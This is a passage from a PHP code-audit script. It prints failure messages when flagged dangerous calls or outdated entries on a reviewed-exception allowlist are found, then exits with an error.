            }
        }
    }

    fwrite(STDERR, "\nEither remove the pattern, or — if the call is genuinely required — add it to\n"
        . 'REVIEWED in ' . basename(__FILE__) . " with an exact count and the reason it is safe.\n");
}

if ($staleAllowances !== []) {
    fwrite(STDERR, "\nFAIL: reviewed exceptions that no longer match the code.\n\n");

    foreach ($staleAllowances as $stale) {
        fwrite(STDERR, '  ' . $stale . "\n");
    }

    fwrite(STDERR, "\nThe counts are a ratchet. When a dangerous call goes away, its allowance goes\n"
        . "with it, so the list can only shrink.\n");
}

exit(1);
